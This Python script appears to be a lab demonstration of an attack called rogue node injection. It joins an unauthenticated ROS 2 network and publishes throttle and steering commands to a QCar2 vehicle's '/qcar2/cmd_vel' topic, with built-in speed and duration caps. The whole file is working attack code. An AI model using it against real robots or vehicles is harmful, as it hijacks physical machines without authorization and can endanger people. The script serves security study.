#!/usr/bin/env python3
"""
rogue_node.py
=============
Attack 1 -- Rogue Node Injection

Demonstrates that any unauthorized laptop on the same network can join the
ROS 2 computational graph and publish drive commands to the QCar2 with zero
authentication required.

Usage:
    python3 rogue_node.py
    python3 rogue_node.py --throttle 0.1 --steering 0.3 --duration 10

Safety limits (enforced, cannot be overridden):
    Max throttle : 0.15
    Max steering : 0.50
    Max duration : 30 seconds
"""

import argparse
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import Twist
import time


# ── Safety limits ─────────────────────────────────────────────────────────────
MAX_THROTTLE = 0.15   # absolute ceiling — enough to see movement, safe on floor
MAX_STEERING = 0.50
MAX_DURATION = 30.0   # seconds


class RogueNode(Node):

    def __init__(self, throttle, steering, duration):
        super().__init__('attacker_node')   # shows up in ros2 node list

        self.throttle = max(-MAX_THROTTLE, min(MAX_THROTTLE, throttle))
        self.steering = max(-MAX_STEERING, min(MAX_STEERING, steering))
        self.duration = min(duration, MAX_DURATION)
        self._count   = 0
        self._t_start = time.time()

        self.pub = self.create_publisher(Twist, '/qcar2/cmd_vel', 10)
        self.timer = self.create_timer(0.1, self.inject)   # 10 Hz

        self.get_logger().warn('=' * 55)
        self.get_logger().warn('ROGUE NODE ACTIVE -- Attack 1: Node Injection')
        self.get_logger().warn('  Topic    : /qcar2/cmd_vel')
        self.get_logger().warn(f'  Throttle : {self.throttle:+.2f}')
        self.get_logger().warn(f'  Steering : {self.steering:+.2f}')
        self.get_logger().warn(f'  Duration : {self.duration:.0f}s')
        self.get_logger().warn('  Run on operator laptop:')
        self.get_logger().warn('    ros2 topic info /qcar2/cmd_vel --verbose')
        self.get_logger().warn('  You will see TWO publishers -- this node wins.')
        self.get_logger().warn('=' * 55)

    def inject(self):
        elapsed = time.time() - self._t_start
        if elapsed >= self.duration:
            self.get_logger().info(
                f'Duration reached ({self.duration:.0f}s). '
                f'Sent {self._count} packets. Stopping.')
            # Send zero command before stopping
            stop = Twist()
            self.pub.publish(stop)
            raise SystemExit

        msg = Twist()
        msg.linear.x  = self.throttle
        msg.angular.z = self.steering
        self.pub.publish(msg)
        self._count += 1

        if self._count % 10 == 0:
            self.get_logger().info(
                f'[{elapsed:5.1f}s] injecting -- '
                f'throttle={self.throttle:+.2f}  '
                f'steering={self.steering:+.2f}  '
                f'packets={self._count}')


def main():
    ap = argparse.ArgumentParser(
        description='Attack 1: Rogue Node Injection against QCar2')
    ap.add_argument('--throttle', type=float, default=0.10,
                    help=f'Forward throttle (capped at {MAX_THROTTLE})')
    ap.add_argument('--steering', type=float, default=0.30,
                    help=f'Steering angle (capped at +/-{MAX_STEERING})')
    ap.add_argument('--duration', type=float, default=10.0,
                    help=f'Attack duration in seconds (max {MAX_DURATION})')
    args = ap.parse_args()

    rclpy.init()
    node = RogueNode(args.throttle, args.steering, args.duration)
    try:
        rclpy.spin(node)
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        # Always send stop command on exit
        try:
            stop_msg = Twist()
            node.pub.publish(stop_msg)
        except Exception:
            pass
        node.destroy_node()
        rclpy.shutdown()
        print('\n[INFO] Rogue node stopped. Stop command sent.')


if __name__ == '__main__':
    main()
